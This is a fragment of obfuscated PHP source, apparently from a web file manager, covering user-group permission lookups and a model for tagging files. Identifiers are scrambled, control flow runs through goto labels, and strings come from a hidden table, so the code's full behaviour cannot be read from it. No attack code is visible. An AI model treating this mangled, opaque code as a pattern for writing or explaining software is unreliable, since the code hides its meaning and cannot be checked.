$cé‡‰ƒÔŞÒ; $c¶¢£·‘Ãå = $eÈòŸİïÉª; $aÇ—Ôì£•¬ = LNG($Cİ•áÌÊä[2304]); } else { if ($A¸¶Ôª½š) { $C»•ß‰Úƒ = $Cø•çÊÓĞ; $c¶¢£·‘Ãå = $B·±î‰²ç; $c—‹åÑß†´ = Model($Cİ•áÌÊä[460])->getInfo($AÃØá‘”µˆ); $aÇ—Ôì£•¬ = $Cİ•áÌÊä[157] . $c—‹åÑß†´[$Cİ•áÌÊä[465]] . $Cİ•áÌÊä[2305] . LNG($Cİ•áÌÊä[2306]); } else { if ($d÷ùŸ©ºæ’) { $C»•ß‰Úƒ = $dØóâ­©Î; $c¶¢£·‘Ãå = $b½®¹à’íÃ; $aÇ—Ôì£•¬ = LNG($Cİ•áÌÊä[2276]); } else { $aÇ—Ôì£•¬ = $Cİ•áÌÊä[33]; } } } $b‹Ÿƒ¬ª = array($Cİ•áÌÊä[2297] => intval($C»•ß‰Úƒ), $Cİ•áÌÊä[2280] => $c¶¢£·‘Ãå, $Cİ•áÌÊä[2298] => $aÇ—Ôì£•¬, $Cİ•áÌÊä[2289] => $this->sourceAuthInfo($aŠ¬Š¢³…É[$Cİ•áÌÊä[369]])); goto B…Îïöô½; B…“·¦•£: $Cİ•áÌÊä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$AÃ«Êµèò) { return array($Cİ•áÌÊä[377] => 0, $Cİ•áÌÊä[418] => !1); } $D—íŸæï›² = $D—íŸæï›² ? $D—íŸæï›² : USER_ID; goto AÉ…•Á³Ö; B…Îïöô½: return $b‹Ÿƒ¬ª; goto e¶ŸçÉ¤æ; e¶ŸçÉ¤æ: } private function groupContainUser($aëç Ö–, $DÈöÅç = false) { return in_array($aëç Ö–, $this->userGroupParents($DÈöÅç)); } private function groupStepToUserGroup($Cè‚äŞ©ÔÓ, $a–¥•·¤Ú‡ = false) { goto fõç¶–øœ; cÎ¹ìÖá¡: return $DÃÛ¦¯¯œÉ; goto DªÕ½¡Ğ×Ó; dÚ‹§†ÌË: $bâµ´ĞéÕ½ = $GLOBALS[$c¾ì¥ÂŞ¾[6]][$c¾ì¥ÂŞ¾[84]][$c¾ì¥ÂŞ¾[2199]] == 1; $A£ŸÇ›Ğ—ğ = $bâµ´ĞéÕ½ ? 3 : 2; foreach ($c˜æ¢ïÊºÏ as $AèàÏøàÙ) { if ($AèàÏøàÙ[$c¾ì¥ÂŞ¾[2108]] == $Cè‚äŞ©ÔÓ) { return 0; } $b§ÔØš¿ ‘ = explode($c¾ì¥ÂŞ¾[47], trim($AèàÏøàÙ[$c¾ì¥ÂŞ¾[461]], $c¾ì¥ÂŞ¾[47])); if ($b§ÔØš¿ ‘[0] == $c¾ì¥ÂŞ¾[470] && count($b§ÔØš¿ ‘) > $A£ŸÇ›Ğ—ğ) { $dÙ‹³ëÂŠÅ = array_reverse(array_slice($b§ÔØš¿ ‘, $A£ŸÇ›Ğ—ğ)); $e…ĞêÚï‚ = array_search($Cè‚äŞ©ÔÓ, $dÙ‹³ëÂŠÅ); if ($e…ĞêÚï‚ !== !1 && $e…ĞêÚï‚ + 1 <= $DÃÛ¦¯¯œÉ) { $DÃÛ¦¯¯œÉ = $e…ĞêÚï‚ + 1; } } } goto cÎ¹ìÖá¡; fõç¶–øœ: $c¾ì¥ÂŞ¾ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c˜æ¢ïÊºÏ = $this->userGroupList($a–¥•·¤Ú‡); $DÃÛ¦¯¯œÉ = 1000; goto dÚ‹§†ÌË; DªÕ½¡Ğ×Ó: } private function userGroupList($E½šÌøÜè = false) { $Eù„ŠÂ¸†á =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $AîÏ¹Ö©Ìé = array(); if (isset($AîÏ¹Ö©Ìé[$E½šÌøÜè])) { return $AîÏ¹Ö©Ìé[$E½šÌøÜè]; } $dœæÕÌ‰ë° = Model($Eù„ŠÂ¸†á[479])->getInfo($E½šÌøÜè); $AîÏ¹Ö©Ìé[$E½šÌøÜè] = array_to_keyvalue($dœæÕÌ‰ë°[$Eù„ŠÂ¸†á[2277]], $Eù„ŠÂ¸†á[2108]); return $AîÏ¹Ö©Ìé[$E½šÌøÜè]; } public function userGroupParents($DÑí³ÌÉê“) { goto a‹äŸàç”; D‘²â•ƒô: $fÙ‡÷¢• = $GLOBALS[$bÈªøÓŠ‹¿[6]][$bÈªøÓŠ‹¿[84]][$bÈªøÓŠ‹¿[2199]] == 1; $A‹¬¦²¨ = $fÙ‡÷¢• ? 3 : 2; foreach ($EÖîÉßÇÑâ as $B×´¥’Á»Ù) { $DàÜ”Š‘ó = array($B×´¥’Á»Ù[$bÈªøÓŠ‹¿[2108]]); $aô´ßÀšÙŞ = explode($bÈªøÓŠ‹¿[47], trim($B×´¥’Á»Ù[$bÈªøÓŠ‹¿[461]], $bÈªøÓŠ‹¿[47])); if ($aô´ßÀšÙŞ[0] == $bÈªøÓŠ‹¿[470] && count($aô´ßÀšÙŞ) > $A‹¬¦²¨) { $AÒù£‹Íº = array_slice($aô´ßÀšÙŞ, $A‹¬¦²¨); $DàÜ”Š‘ó = array_merge($DàÜ”Š‘ó, array_reverse($AÒù£‹Íº)); } $EÓóè‘Øºğ = array_merge($EÓóè‘Øºğ, $DàÜ”Š‘ó); } goto e±—Ù³íø®; e±—Ù³íø®: $D®˜¼Ãô›®[$DÑí³ÌÉê“] = array_unique($EÓóè‘Øºğ); return $D®˜¼Ãô›®[$DÑí³ÌÉê“]; goto Cù·âóîªŞ; AÉù†„—Ó: if (isset($D®˜¼Ãô›®[$DÑí³ÌÉê“])) { return $D®˜¼Ãô›®[$DÑí³ÌÉê“]; } $EÖîÉßÇÑâ = $this->userGroupList($DÑí³ÌÉê“); $EÓóè‘Øºğ = array(); goto D‘²â•ƒô; a‹äŸàç”: $bÈªøÓŠ‹¿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $D®˜¼Ãô›® = array(); $DÑí³ÌÉê“ = $DÑí³ÌÉê“ ? $DÑí³ÌÉê“ : USER_ID; goto AÉù†„—Ó; Cù·âóîªŞ: } public function authTargetInfoMake($a‡©Ùñß¦) { goto F›Ê¢Á¸ÆÄ; dÃ¡ë†¹´¡: foreach ($a‡©Ùñß¦ as $cÅ¯ÄíÉò‘) { if ($cÅ¯ÄíÉò‘[$dƒÈÊ¨Ò‘¹[371]] == SourceModel::TYPE_USER) { $e³¢êº÷ÅÑ[] = intval($cÅ¯ÄíÉò‘[$dƒÈÊ¨Ò‘¹[458]]); } else { if ($cÅ¯ÄíÉò‘[$dƒÈÊ¨Ò‘¹[371]] == SourceModel::TYPE_GROUP) { $BÇÚ¾ñò¬¾[] = intval($cÅ¯ÄíÉò‘[$dƒÈÊ¨Ò‘¹[458]]); } } } if ($e³¢êº÷ÅÑ) { $e³¢êº÷ÅÑ = Model($dƒÈÊ¨Ò‘¹[476])->userListInfo($e³¢êº÷ÅÑ); } if ($BÇÚ¾ñò¬¾) { $bö³ª˜ğ»˜ = array($dƒÈÊ¨Ò‘¹[2185] => array($dƒÈÊ¨Ò‘¹[384], $BÇÚ¾ñò¬¾)); $BÇÚ¾ñò¬¾ = Model($dƒÈÊ¨Ò‘¹[460])->field($dƒÈÊ¨Ò‘¹[2198])->where($bö³ª˜ğ»˜)->select(); $BÇÚ¾ñò¬¾ = array_to_keyvalue($BÇÚ¾ñò¬¾, $dƒÈÊ¨Ò‘¹[2108]); } goto dÓö«ºŠ†×; dÓö«ºŠ†×: return array($dƒÈÊ¨Ò‘¹[2307] => $e³¢êº÷ÅÑ, $dƒÈÊ¨Ò‘¹[2308] => $BÇÚ¾ñò¬¾); goto B‚ï˜‡Ñ†–; F›Ê¢Á¸ÆÄ: $dƒÈÊ¨Ò‘¹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e³¢êº÷ÅÑ = array(); $BÇÚ¾ñò¬¾ = array(); goto dÃ¡ë†¹´¡; B‚ï˜‡Ñ†–: } public function authInfo($E«·Şƒ×¸Ì) { $Fä¢è‹‡òö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($E«·Şƒ×¸Ì[$Fä¢è‹‡òö[2252]]) { $DÕñ¡ƒå‹ğ = Model($Fä¢è‹‡òö[2271])->listData($E«·Şƒ×¸Ì[$Fä¢è‹‡òö[2252]]); if (!$DÕñ¡ƒå‹ğ) { return !1; $fŞß¢Œ†Ä = Model($Fä¢è‹‡òö[2271])->listData(); $f¤¬Ï…Ì‹à = array_filter_by_field($fŞß¢Œ†Ä, $Fä¢è‹‡òö[376], $Fä¢è‹‡òö[470]); return $f¤¬Ï…Ì‹à; } $B†–…´„è = array_field_key($DÕñ¡ƒå‹ğ, array($Fä¢è‹‡òö[367], $Fä¢è‹‡òö[28], $Fä¢è‹‡òö[376], $Fä¢è‹‡òö[2127], $Fä¢è‹‡òö[2130])); $B†–…´„è[$Fä¢è‹‡òö[2309]] = $E«·Şƒ×¸Ì; return $B†–…´„è; } else { return array($Fä¢è‹‡òö[385] => 0, $Fä¢è‹‡òö[2114] => $E«·Şƒ×¸Ì[$Fä¢è‹‡òö[2253]], $Fä¢è‹‡òö[386] => $Fä¢è‹‡òö[33], $Fä¢è‹‡òö[2127] => $Fä¢è‹‡òö[2310]); } } } goto D±‹¹Óƒ±; c«î•‚Òä: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($E³ÍÊ) { $AÙ¤ÚŸ°Ù­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($AÙ¤ÚŸ°Ù­[2204] => array(USER_ID, $AÙ¤ÚŸ°Ù­[2205])); } protected function listData() { $CæÉ´«‹ÔÎ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B¬‚ÁÇ‡’¡ = array($CæÉ´«‹ÔÎ[1428] => USER_ID, $CæÉ´«‹ÔÎ[436] => array($CæÉ´«‹ÔÎ[2208], 0)); $c¦ˆ¶¸ÚÕÈ = $CæÉ´«‹ÔÎ[2210]; $fœ•õ¡ªŠÅ = $this->field($c¦ˆ¶¸ÚÕÈ)->where($B¬‚ÁÇ‡’¡)->order($CæÉ´«‹ÔÎ[2211])->select(); return $fœ•õ¡ªŠÅ ? $fœ•õ¡ªŠÅ : array(); } protected function listByTag($E÷…Šçì”’) { } protected function addToTag($Eà°›¾‡¼ß, $A—ŠŒ‘¶) { $a‹ñã¨â× =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!Model($a‹ñã¨â×[2346])->listData($A—ŠŒ‘¶) || !Model($a‹ñã¨â×[754])->pathInfo($Eà°›¾‡¼ß)) { return !1; } $BœÃ®¬ö‹Õ = array($a‹ñã¨â×[1428] => USER_ID, $a‹ñã¨â×[436] => $A—ŠŒ‘¶, $a‹ñã¨â×[387] => $Eà°›¾‡¼ß, $a‹ñã¨â×[388] => $a‹ñã¨â×[382], $a‹ñã¨â×[386] => $a‹ñã¨â×[33], $a‹ñã¨â×[2112] => 0); if ($this->where($BœÃ®¬ö‹Õ)->find()) { return !1; } return $this->add($BœÃ®¬ö‹Õ); } protected function removeFromTag($E´–ÑÍ©”, $Fñ‘êŠ†Ì¨) { $EŞª¯‰Æí =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!Model($EŞª¯‰Æí[2346])->listData($Fñ‘êŠ†Ì¨)) { return !1; } if (is_array($E´–ÑÍ©”)) { $E´–ÑÍ©” = array($EŞª¯‰Æí[7], $E´–ÑÍ©”); } $fáá…ÜÆù = array($EŞª¯‰Æí[1428] => USER_ID, $EŞª¯‰Æí[436] => $Fñ‘êŠ†Ì¨, $EŞª¯‰Æí[388] => $EŞª¯‰Æí[382], $EŞª¯‰Æí[387] => $E´–ÑÍ©”); return $this->where($fáá…ÜÆù)->delete(); } protected function removeByTag($EÒİñÓ¨) { $C´ÊÂÅ”öÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$EÒİñÓ¨) { return !1; } $Bø‘Á¨¤ÑÄ = array($C´ÊÂÅ”öÀ[1428] => USER_ID, $C´ÊÂÅ”öÀ[436] => $EÒİñÓ¨); return $this->where($Bø‘Á¨¤ÑÄ)->delete(); } protected function removeBySource($D×£õ‡Î¥) { $d‚ËÒŸ½å÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_array($D×£õ‡Î¥)) { $D×£õ‡Î¥ = array($d‚ËÒŸ½å÷[7], $D×£õ‡Î¥); } $C±ÒòÉÓè— = array($d‚ËÒŸ½å÷[1428] => USER_ID, $d‚ËÒŸ½å÷[387] => $D×£õ‡Î¥, $d‚ËÒŸ½å÷[436] => array($d‚ËÒŸ½å÷[924], 0)); return $this->where($C±ÒòÉÓè—)->delete(); } }